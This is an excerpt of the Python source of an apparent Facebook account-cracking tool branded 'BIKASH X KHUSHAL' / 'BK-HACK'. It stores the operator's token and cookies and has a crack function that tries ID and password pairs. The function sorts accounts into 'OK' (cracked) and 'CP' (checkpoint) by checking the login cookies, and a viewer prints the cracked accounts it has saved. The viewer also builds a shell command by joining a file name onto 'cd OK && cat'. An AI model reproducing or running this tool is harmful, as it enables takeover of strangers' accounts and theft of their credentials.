...
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'BK','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'BK','10':'Oktober','11':'November','12':'Desember'}
###########################################################################################
...
\033[1;88m╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝
\033[1;88m----------------------------------------------
\033[1;84m Author    : BIKASH DON x KHUSHAL VALA
\033[1;84m Github    : BIKASH-BRAND
\033[1;84m Facebook  : BIKASH MAGAR
\033[1;84m Tool Name : BIKASH X KHUSHAL
\033[1;84m Type type : FREE
\033[1;84m Version   : 1.0
\033[1;84m----------------------------------------------
 BIKASH PRO VERSION 1.0
 FEEL THE POWER OF BIKASH x KHUSHAL(⁠⌐⁠■⁠-⁠■⁠)
\033[1;37m----------------------------------------------""")
""")
def login():
	try:
		token = open('tokBK.txt','r').read()
		cok = open('cokBK.txt','r').read()
...
def login_lagi334():
	try:
		...
		ken = open("tokBK.txt", "w").write(tok)
		cok = open("cokBK.txt", "w").write(cookie)
		print(f'{x}[{h}•{x}]{h} Good LOGIN python BK-Brand.py !{x} ');time.sleep(1)
		os.system("python BK-Brand.py")
		exit()
	except Exception as e:
		os.system('rm -rf cokBK.txt && rm -rf tokBK.txt')
		login_lagi334()
# MENU
...
def menu(my_id):
	...
	if jh in ['1','01']:
		...
		os.system("xdg-open  https://t.me/BK4x")
		os.system("python BK-Brand.py")
	elif jh in ['6','06']:
		...
		os.system('rm -rf tokBK.txt')
		os.system('rm -rf cokBK.txt')
		print(x+'['+h+'•'+x+'] Wait ...')
		time.sleep(1)
		sw = ' LOGOUT '
		os.system("python BK-Brand.py")
...
def result():
	...
	cetak(nel(kis, title='BK-HACK'))
	kz = input(x+'['+p+'BK'+x+'] CHOOICE : ')
	if kz in ['1','01']:
		...
		if len(vin)==0:
			...
			try:lin = open('OK/'+geh,'r').read()
				...
				time.sleep(2)
				back()
			akun = '# BK YOUR OK ACCOUNT'
			sol().print(mark(akun, style='green'))
			hus = os.system('cd OK && cat '+geh)
			akun2 = '# BK YOUR OK ACCOUNT'
			sol().print(mark(akun, style='green'))
			input(x+'['+h+'•'+x+'] LOGOUT ')
			back()
	elif kz in ['0','00']:
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s[BK] %s/%s OK:%s CP:%s  %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='BK-OK'))
					break
